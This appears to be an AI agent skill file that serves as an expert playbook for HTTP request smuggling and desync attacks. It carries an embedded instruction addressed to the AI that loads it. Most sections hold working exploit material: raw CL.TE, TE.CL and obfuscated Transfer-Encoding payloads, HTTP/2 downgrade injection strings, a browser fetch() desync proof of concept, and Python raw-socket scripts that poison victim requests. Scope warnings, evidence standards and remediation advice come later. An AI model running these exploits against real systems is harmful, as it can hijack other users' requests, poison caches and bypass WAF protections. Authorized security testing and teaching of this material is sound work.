---
name: request-smuggling
description: >-
  HTTP request smuggling and desynchronization testing. Use when front proxies,
  CDNs, or load balancers disagree with the origin on message framing
  (Content-Length vs Transfer-Encoding), on HTTP/2→HTTP/1 translation, or when
  exploring client-side desync via browser fetch pipelines.
---

# SKILL: HTTP Request Smuggling — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert HTTP desync techniques. Covers CL.TE, TE.CL, TE.TE obfuscation variants, HTTP/2 downgrade and pseudo-header confusion, client-side desync (browser `fetch` pipelines), and tool-assisted fuzzing. Assumes familiarity with raw HTTP/1.1 framing and reverse-proxy topologies. This is not “header injection” — it is **message boundary disagreement** between hops.

Routing note: load this skill when you suspect CDN/reverse-proxy and origin disagree on request-end boundaries, or when abnormal concatenation appears during H2-to-H1 downgrade.

## 0. RELATED ROUTING

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the HTTP client library is **Apache HttpClient <= 4.5.9** (HTTPCLIENT-1974/1978) — injecting `瘍瘊` (U+760D U+760A, low bytes `\r\n`) into a header value causes the underlying char-to-byte writer to emit a literal CRLF, splitting the request at the origin without relying on CL/TE disagreement

## 1. QUICK START

### CL.TE first probe (front-end trusts CL, back-end trusts chunked)

Assumption: front end prioritizes `Content-Length`, back end prioritizes `Transfer-Encoding: chunked`. Use a very short CL so the front end accepts a fake end, while the back end continues chunk parsing and leaves remaining bytes for the next request.

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Front end reads only 13 bytes based on `Content-Length: 13` (that is, `0\r\n\r\nSMUGGLED`, 13 bytes total) and considers the request complete.
- Back end parses as chunked: after the `0` end chunk, it treats **`SMUGGLED` and onward** as the start byte stream of the **next request**.

### TE.CL first probe (front-end trusts chunked, back-end trusts CL)

Assumption: front end parses chunked and back end only reads `Content-Length`. Set **CL equal to the number of bytes in the chunk-length line** (commonly `4`: two hex characters + `\r\n`), so the back end consumes only the length line and leaves the rest buffered for follow-up request splicing.

Embed a second request in the chunk (all line endings are **CRLF**; `35` hex chunk length = 53 bytes):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

On the wire, the chunk body must be exactly 53 bytes; if you change path/headers, recalculate chunk length and update the hex length line accordingly.

### Safety note

Test only within **authorized scope**; concurrent smuggling can poison connection pools, corrupt caches, or impact other tenants. Prefer isolated environments or low-traffic windows.

---

## 2. CORE CONCEPT

**Definition**: two (or more) HTTP processing entities disagree on where request one ends and request two begins in the **same TCP/TLS stream**, allowing an attacker to include a **partial or full** second request inside one logical request.

```
  Client          Front (proxy/WAF)              Back (origin)
     |                     |                            |
     |==== Request A+B ===>|                            |
     |                     | parses boundary #1         | parses boundary #2
     |                     |         \                  |         /
     |                     |          different split points
     |                     |                            |
     v                     v                            v
                   Request A (seen)              Request A' + smuggled B
```

**Difference from CRLF injection**: CRLF usually injects into **responses** or **header lines**; smuggling targets implementation differences in **RFC 7230 message framing** (`Content-Length` / `chunked`).

**High-value impact**: WAF rule bypass (smuggled body not visible in front-end request), hijacking other users' requests on shared-origin connections (queue poisoning), cache-poisoning assistance, and authentication-boundary confusion.

---

## 3. CL.TE VULNERABILITIES

**Pattern**: front end trusts **`Content-Length`**; back end trusts **`Transfer-Encoding: chunked`**.

**Exact example** (same as §0): `Content-Length: 13` and `Transfer-Encoding: chunked` both exist, body is:

```text
0\r\n\r\nSMUGGLED
```

Byte count: `0` + `\r\n` + `\r\n` + `SMUGGLED` = 13.

**Back-end perspective**: the chunked stream ends at `0\r\n\r\n`; if `SMUGGLED` starts with `METHOD SP` or another valid request prefix, it becomes a **smuggled request-line prefix**.

**Tuning**: if the target is sensitive to duplicate headers, casing, or spaces, minimally adjust `Transfer-Encoding` variants (see §4) while preserving semantics to match a combo where front end ignores TE and back end executes TE.

---

## 4. TE.CL VULNERABILITIES

**Pattern**: front end parses **chunked**; back end only reads **`Content-Length`** (or too-short CL).

**Intent**: front end treats the whole malicious byte stream as body; back end reads only CL length, leaving remaining bytes buffered to splice with later legitimate requests.

**Full TE.CL with embedded second request** (same family as §0; `Content-Length: 4` + first chunk-length line `35\r\n`):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

Explanation:

- **Back end (CL)**: reads only 4 bytes from the message body start -> `3` `5` `\r` `\n`, marks body complete, and leaves the remaining bytes in the TCP read buffer.
- **Front end (TE)**: parses full stream as chunked and forwards/consumes `GET /admin...` as body content of the **already-closed first request** (product-dependent); mismatch with back-end boundary interpretation forms TE.CL.

For longer smuggling (e.g., `POST` + `Content-Length: 11` + `x=1`), chunk length is about `76` (hex `0x76` = 118 bytes); `Content-Length: 4` can still pin the back end to reading only the length line.

**Practical notes**: chunk length must be valid hex; second request must meet target expectations for Host, path, and session cookie; timing window and connection-reuse strategy determine whether you hit another user's request.

---

## 5. TE.TE VULNERABILITIES

**Pattern**: both front and back claim to process `Transfer-Encoding`, but differ on which TE value is effective or valid -> still producing equivalent desync where one side sees chunked and the other does not.

Use the following **8 obfuscation variants** to probe parser differentials (single-line display; `\t` means a real TAB):

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```

```http
Transfer-Encoding: x
```

```http
Transfer-Encoding:[TAB]chunked
```
(Replace `[TAB]` with real `\x09`.)

```http
 Transfer-Encoding: chunked
```
(One leading space at line start.)

```http
X: X
Transfer-Encoding: chunked
```
(Previous line value is `X` and next line starts with `Transfer-Encoding`: this uses **line continuation / lenient header parsing** so one hop may merge or split lines incorrectly; separator between `X` and `Transfer-Encoding` may be `\n` or `\r\n` depending on the target stack.)

```http
Transfer-Encoding
: chunked
```
(Field name and colon are on **different physical lines**; some parsers still treat it as valid `Transfer-Encoding: chunked`.)

**Strategy**: for each (front, back) pair, enumerate which side accepts each variant as `chunked`, then map to equivalent CL.TE or TE.CL using §2/§3.

---

## 6. HTTP/2 REQUEST SMUGGLING

### H2 -> H1 Downgrade

Common scenario: edge supports HTTP/2 and origin uses HTTP/1.1. If implementation does not strictly normalize header fields and body boundaries, you may observe:

- incorrect pseudo-header to regular-header mapping order;
- forbidden headers (such as some `Connection` combinations) forwarded incorrectly;
- duplicate-header merge rules inconsistent with the origin.

### Pseudo-header / header-injection smuggling (concept payload)

Attack surface comes from downstream H1 parsers treating certain bytes as the **start of a new request**. A common research/CTF approach is to place near-request bytes inside header values that one layer ignores but another treats literally:

```text
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

**Meaning**: if one hop keeps the full string in a header value and the next hop mis-splits during H1 reconstruction, parsing may start a new `GET / HTTP/1.1` at `\r\n\r\n`.

**Testing directions**:

- duplicate and case handling for `Transfer-Encoding` / `Content-Length` in H2 (H2 requires lowercase, but translation layers can fail);
- downgrade behavior when `:method` or `:path` includes abnormal characters;
- interactions between tunneling or extended CONNECT and smuggling.

---

## 7. CLIENT-SIDE DESYNC

**Scenario**: browser request-body handling differs from middleware/origin, or **`no-cors` + preflight exemptions** permit atypical messages that create queue effects similar to classic CL.TE/TE.CL (architecture-dependent).

**HEAD + GET chain**: some stacks historically mishandle HEAD response bodies, later pipelining, or connection reuse; validate with concrete browser versions and target proxy behavior.

**JavaScript PoC shape** (illustrative: set body to raw bytes containing `GET`, with `no-cors` and credentials):

```javascript
fetch("https://target.example/vulnerable", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  body: "GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n"
});
```

**Note**: browser security model limits direct readability; success often appears as side effects on other requests over the same connection or as abnormal server logs/behavior, not direct response reading. Evaluate with SOP, CORS, and extension/proxy factors.

---

## 8. TOOLS

| Tool | Purpose |
|------|------|
| **Burp Suite — HTTP Request Smuggler** (BApp Store) | Automated desync detection, common variants, timing-delta checks |
| **defparam/smuggler** (GitHub) | Python scripts for batch generation/sending of smuggling probes |
| **dhmosfunk/simple-http-smuggler-generator** (GitHub) | Quickly assemble raw CL.TE / TE.CL message templates |

**Usage advice**: first passively confirm a **front-end + origin** two-hop path, then select minimally disruptive probes, and lower concurrency in production.

---

## 9. DETECTION DECISION TREE

```
                        Start: reverse proxy / CDN in path?
                                    |
                    NO -------------+------------- YES
                    |                               |
            Low classic smuggling                    |
            (still test H2 desync)                   v
                                            Can you send TE + CL together?
                                                    |
                              NO -------------------+------------------- YES
                              |                                         |
                      Test H2-only issues                    Front prefers which?
                      (pseudo-header, reset)                            |
                                        +-------------------------------+-------------------------------+
                                        |                               |                               |
                                   CL wins                          TE wins                         errors /
                                        |                               |                          connection
                                        v                               v                               |
                                   CL.TE probes                    TE.CL probes                    TE.TE obfuscation
                                   (Sec 0,2)                       (Sec 0,3)                       (Sec 4)
                                        |                               |                               |
                                        v                               v                               v
                              Time / content /                    Adjust chunk                     Pairwise matrix:
                              queue poisoning                     sizes + CL                      which hop accepts
                              signals?                            alignment                       which variant?
                                        |                               |                               |
                                        +-------------------------------+-------------------------------+
                                                                        |
                                                                        v
                                                              Confirm with second request
                                                              smuggled (replay-safe)
                                                              or Collaborator-style side signal
```

---

### Advanced Reference

Also load [H2_SMUGGLING_VARIANTS.md](./H2_SMUGGLING_VARIANTS.md) when you need:
- H2.CL and H2.TE variants with byte-level payload examples
- CL.0 (connection close desync) — technique and detection
- Fat GET request smuggling (body in GET request)
- Request smuggling → cache poisoning chain (response queue misalignment)
- Client-side desync (CSD) via browser Fetch API with JavaScript PoC templates
- CDN/reverse proxy product behavior matrix (HAProxy, Nginx, Apache, Cloudflare, AWS ALB, Envoy, Varnish, etc.)

---

## 9b. LEGACY ROUTING MAP

- **Input enters interpreter/query language/template** (not HTTP framing) -> [Injection Testing Router](../injection-checking/SKILL.md) (then drill down into XSS, SQLi, SSTI, etc.).
- **Response header splitting / Location CRLF** -> [CRLF Injection](../crlf-injection/SKILL.md).
- **Cache and path-key confusion** -> [Web Cache Deception](../web-cache-deception/SKILL.md).

Once confirmed as an **HTTP message-boundary** issue rather than parameter injection, **stay in this skill** to avoid misrouting into general injection workflows.

---

## 10. EXECUTION PRIMITIVES

Smuggling needs raw bytes, not a normal HTTP client. These blocks send deliberately malformed
framing and **measure** the disagreement; each returns an interpretable result rather than prose.

### 10.1 Timing baseline - the first thing to establish

```bash
# Every smuggling conclusion rests on a timing delta. Measure the well-formed baseline first.
for i in $(seq 1 5); do
  curl -s -o /dev/null -w '%{time_total}
' -X POST "https://target.tld/"        -H 'Content-Type: application/x-www-form-urlencoded' --data 'a=1'
done | sort -n | awk '{a[NR]=$1} END{printf "median_baseline=%.3fs
", a[int((NR+1)/2)]}'
```

A CL.TE probe that hangs ~5-10s past the median, consistently, is the classic signal. **A single slow
response is not evidence** - the front end may simply have been busy. Run the probe at least three
times and compare medians, not one sample against one sample.

### 10.2 CL.TE probe with a real timeout

```bash
python3 - <<'PY'
import socket, ssl, time
HOST, PORT, TLS = "target.tld", 443, True
# front end uses Content-Length, back end uses Transfer-Encoding: chunked
req = (b"POST / HTTP/1.1\r\n"
       b"Host: target.tld\r\n"
       b"Content-Type: application/x-www-form-urlencoded\r\n"
       b"Content-Length: 6\r\n"
       b"Transfer-Encoding: chunked\r\n"
       b"\r\n"
       b"0\r\n"
       b"\r\n"
       b"X")
for n in range(3):
    s = socket.create_connection((HOST, PORT), timeout=15)
    if TLS: s = ssl.create_default_context().wrap_socket(s, server_hostname=HOST)
    t0 = time.time()
    s.sendall(req)
    try: s.recv(4096)
    except socket.timeout: pass
    print(f"run {n}: {time.time()-t0:.3f}s")
    s.close()
PY
```

The request declares `Content-Length: 6` so the front end forwards only `0\r\n\r\nX`, and the back
end - reading chunked - waits for a terminating chunk that never arrives. The **hang is the finding's
first half**; the second half is the desync effect below.

### 10.3 Proving the desync effect, not just the delay

```bash
python3 - <<'PY'
import socket, ssl, time
HOST, PORT, TLS = "target.tld", 443, True
PREFIX = (b"POST / HTTP/1.1\r\nHost: target.tld\r\n"
          b"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n"
          b"1\r\nZ\r\nQ")
# request B is the 'victim': a normal request whose response we can recognise
VICTIM = b"GET / HTTP/1.1\r\nHost: target.tld\r\nConnection: keep-alive\r\n\r\n"
res = []
for n in range(3):
    s = socket.create_connection((HOST, PORT), timeout=15)
    if TLS: s = ssl.create_default_context().wrap_socket(s, server_hostname=HOST)
    s.sendall(PREFIX); time.sleep(0.3)
    s.sendall(VICTIM)
    try: data = s.recv(8192)
    except socket.timeout: data = b"<timeout>"
    res.append(data[:120]); s.close()
    time.sleep(0.5)
for i, r in enumerate(res): print(i, r)
PY
```

The **victim request's response being wrong** - a `404` for a path it did not request, a response
belonging to the prefix, or a `400` - is the desync. The prefix's `Q` becomes the start of the next
request's method, so the back end reads `QGET / HTTP/1.1...` and replies with an error that does not
match a normal `GET /`. Compare against a control where the prefix is sent alone with no victim.

### 10.4 TE obfuscation sweep

```bash
python3 - <<'PY'
import socket, ssl, time
HOST, PORT, TLS = "target.tld", 443, True
VARIANTS = {
 "TE:chunked":                  "Transfer-Encoding: chunked",
 "TE:xchunked":                 "Transfer-Encoding: xchunked",
 "TE: chunked (space)":         "Transfer-Encoding : chunked",
 "TE:space-value":              "Transfer-Encoding:  chunked",
 "X-TE+TE":                     "X-Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked",
 "TE:x, chunked":               "Transfer-Encoding: x, chunked",
 "TE:chunked, x":               "Transfer-Encoding: chunked, x",
 "TE:CHUNKED":                  "Transfer-Encoding: CHUNKED",
 "TE:bewitched":                "Transfer-Encoding: chunked\r\nTransfer-encoding: identity",
}
for name, te in VARIANTS.items():
    body = te.replace("Transfer-Encoding: ","").replace("Transfer-Encoding : ","")
    hdr = f"Transfer-Encoding: {body}" if not te.startswith("X-") else te
    req = (f"POST / HTTP/1.1\r\nHost: {HOST}\r\nContent-Length: 4\r\n{hdr}\r\n\r\n"
           "1\r\nZ\r\nQ").encode()
    s = socket.create_connection((HOST, PORT), timeout=12)
    if TLS: s = ssl.create_default_context().wrap_socket(s, server_hostname=HOST)
    t0 = time.time(); s.sendall(req)
    try: resp = s.recv(2048)
    except socket.timeout: resp = b"<timeout>"
    print(f"{name:28} {time.time()-t0:6.3f}s  {resp[:40]!r}")
    s.close(); time.sleep(0.4)
PY
```

Expected: every variant that reaches an agreeing pair of hops returns fast, and the ones where the
hops **disagree** hang or error distinctly. Record the delta per variant - the differing row is the
one that tells you which header the front end and back end each honour.

### 10.5 HTTP/2 downgrade desync

```bash
# h2c prior-knowledge, then a request whose body can be split by the H2->H1 translation
curl -sS --http2-prior-knowledge -X POST "https://target.tld/" \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     --data-binary $'a=1\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.tld\r\n\r\n' -o /dev/null -w '%{http_code}\n'
# header-name smuggling: forbidden characters are stripped by the H2 layer, not the H1 origin
curl -sS --http2 "https://target.tld/" \
     -H $'foo: bar\r\nTransfer-Encoding: chunked' -o /dev/null -w '%{http_code}\n'
```

If the translation layer strips `\r\n` from a header value the origin never sees it, which is a
negative result. If the injected `GET /admin` line produces a **second, unrelated response**, the
downgrade is reconstructing boundaries from attacker-controlled content.

### 10.6 Client-side desync in a real browser

```bash
cat > /tmp/csd.html <<'HTML'
<script>
const PAYLOAD = "POST / HTTP/1.1\r\nHost: target.tld\r\n" +
                "Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n" +
                "1\r\nZ\r\nQ";
fetch('https://target.tld/', {method:'POST', body: PAYLOAD,
      mode:'cors', credentials:'include', headers:{'Content-Type':'text/plain'}})
  .then(r => console.log('probe done', r.status))
  .catch(e => console.log('probe err', e));
</script>
HTML
python3 -m http.server 8080 --directory /tmp &   # serve to a browser you control
sleep 1; echo "open http://127.0.0.1:8080/csd.html with the devtools console visible"
```

The **victim request** is then any same-origin `fetch` the page makes afterwards. Evidence is that
request returning another request's response - a `404` for a valid path, or an admin response for a
non-admin URL. Timing alone does not establish CSD.

### 10.7 Tool-assisted detection

```bash
# Burp: install 'HTTP Request Smuggler' from the BApp Store, then
#   right-click target -> Extensions -> HTTP Request Smuggler -> Smuggle probe
python3 -m pip install --user smuggler          # defparam/smuggler
smuggler -u https://target.tld/ --timeout 15 --threads 4
# nuclei has smuggling templates in the http/misconfiguration category
nuclei -u https://target.tld/ -t http/misconfiguration/ -tags smuggling -timeout 15
```

Tools **find candidates**; they do not establish impact. Every hit must be reproduced by hand with
10.2-10.4, because the tool's timing heuristic produces false positives on a slow origin.

---

## 11. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Is there a **two-hop** path (front end/CDN plus origin), confirmed independently? | the entire bug class needs two parsers; a direct-to-origin test proves nothing |
| 2 | Does the malformed request produce a **consistent timing delta** across 3+ runs versus the median baseline? | rules out origin slowness and a one-off |
| 3 | Does a **victim request receive a response it did not request** (wrong path, wrong body, `400`)? | the actual desync, not merely a hang |
| 4 | Can you reproduce the desync **without the aggressive timeout**, with a plausible response? | separates the real boundary disagreement from a dropped connection |
| 5 | Is the effect **repeatable and steerable** - can you choose which request is poisoned? | control, which is what turns desync into exploitation |
| 6 | Does the poison reach a **security-relevant target** (another user's request, a cache, an auth check)? | impact, not just an anomaly |
| 7 | Is the front-end/origin pair **the same in production**, and is the test in scope? | lab-only desync is common; verify the deployed topology |

**The hang is a lead; the poisoned victim is the finding.** A CL.TE probe that times out tells you
the hops disagree on framing. It becomes a report when a *second* request on the same connection
receives the wrong response, or when a cache is poisoned for a victim - and you show both requests
and both responses.

**Never test this with production users on the connection.** A desync can deliver one user's request
to another user's session; scope the test to a connection you control, use a canary path, and stop
on the first confirmed poison rather than sweeping for maximum effect.

---

## 12. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **exact raw bytes sent**, including the CL and TE headers and the `\r\n` placement | the malformation is the technique; a paraphrase is unreadable and unreproducible |
| The **timing measurements** - baseline median plus 3+ probe runs | establishes the delta and rules out a slow origin |
| The **victim request and its wrong response**, both captured | this is the desync; without a victim there is no impact |
| The **control run** with a well-formed request on the same connection | proves the anomaly is caused by the framing, not the endpoint |
| The **two-hop topology** evidence (front-end and origin identified by header or behaviour) | the bug requires two parsers and does not exist without them |
| The **tool variant name** if a tool found it, plus the manual reproduction | tools find candidates; the manual run is the evidence |
| The **environment** - target host, timestamp, connection count, and whether keep-alive is in play | smuggling is stateful across a connection; the run conditions matter |
| Confirmation that no **other user's session** was affected, or a description of exactly what was observed | smuggling can cross tenants; the report must state the blast radius honestly |
| **Impact statement** - which request can be poisoned, and what that request does | converts an anomaly into a finding |

Report the **disagreement and the effect**: "`Content-Length` plus `Transfer-Encoding: chunked` makes
the edge forward 6 bytes and the origin wait 5.1-5.3s (median baseline 0.09s, 3/3 runs); on that
connection a following `GET /x` returns a `400` referencing the method `QGET`, confirming the origin
parsed our trailing byte as the next request's method", never "the server is vulnerable to request
smuggling".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A single slow response with no repeatable delta | origin load, not a framing disagreement |
| The hang reproduces but no victim request is ever affected | the front end may simply be holding the connection; no desync proven |
| Testing directly against the origin (no front end) | the bug class requires two parsers; single-hop framing is a different issue |
| The front end returns `400` to the malformed request at the edge | the edge rejected it - the control worked |
| `curl` "normalises" the request and removes your malformation | client artefact; use raw sockets as in 10.2 |
| A `400`/`502` on every malformed variant identically | the edge is validating framing, not disagreeing with the origin |
| Timing delta explained by a rate limiter or WAF challenge | measure with the same request shape at baseline |
| The victim's "wrong" response is the origin's normal error page | must be a response for a **different** request, not a generic error |
| A tool reports smuggling but the manual reproduction returns baseline timings | tool false positive |
| A cached response differs after your probe but the cache TTL had simply expired | re-test with a fresh canary key |
| The test affected a third party's session or data | that is an incident, not a finding; stop and report it as such |

**No victim, no impact, no finding.** The timing delta alone belongs in a working note.

---

## 13. REMEDIATION REFERENCE

1. **Normalise framing at the edge and reject ambiguity** - accept exactly one framing header, reject any request carrying both `Content-Length` and `Transfer-Encoding`, and reject duplicate or obfuscated `Transfer-Encoding` values with a `400`. This closes the whole CL.TE/TE.CL family at the front door.
2. **Make every hop agree by construction** - terminate HTTP/1.1 at the edge, ensure the origin only ever receives a normalised message, and never let an untrusted hop forward raw ambiguous bytes. Hop-by-hop disagreement is the root cause.
3. **Use HTTP/2 end to end where possible** - a hop that never downgrades to HTTP/1.1 removes the H2-to-H1 translation class; where a downgrade is unavoidable, reject requests whose headers or body would be altered by the translation.
4. **Strip or reject forbidden characters after H2 translation** - validate the reconstructed HTTP/1.1 message server-side and treat any `\r`/`\n` inside a header value as a hard error rather than passing it downstream.
5. **Disable connection reuse between untrusted clients and the origin** - allocate a fresh upstream connection per downstream request, or re-key and drain on error, so a leftover byte cannot be read as the prefix of the next user's request.
6. **Keep front end and origin on the same vendor and version where feasible** - most desyncs come from a patched edge in front of an unpatched origin (or the reverse); track framing behaviour as a deployment invariant and test it in CI.
7. **Patch known framing CVEs across the whole chain** - the same bug returns through a different component each year; maintain an inventory of every proxy, CDN, and server in the path and verify the patched state of each, not just the origin.
8. **Reject and alert on malformed framing rather than tolerating it** - a WAF or edge rule that logs and rejects ambiguous requests both blocks the attack and gives you the detection signal.
9. **Protect caches from desync poisoning** - include enough of the request in the cache key, never cache responses to requests with a body on GET, and treat a cache entry with an unexpected `Content-Length` as a poisoning indicator.
10. **Defend the client side too** - browsers/frameworks should not allow a `fetch` to inject a request body that the connection reuses; server-side, ensure a connection with an unparsed remainder is closed rather than returned to the pool.
11. **Test framing invariants in CI with a raw-socket harness** - assert that a request with both framing headers is rejected, that an obfuscated `Transfer-Encoding` is rejected, and that a keep-alive connection never returns a mismatched response. Framing regressions are deployment regressions.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) - the same boundary-splitting primitive through a Unicode encoder bug
- [web-cache-deception](../web-cache-deception/SKILL.md) - the cache-side effect a desync can be used to achieve
- [crlf-injection](../crlf-injection/SKILL.md) - header splitting, which desync is sometimes confused with
- [http-parameter-pollution](../http-parameter-pollution/SKILL.md) - the parameter-level version of hop disagreement
- [burp-scan](../burp-scan/SKILL.md) - the tool that finds candidates, plus how to confirm them
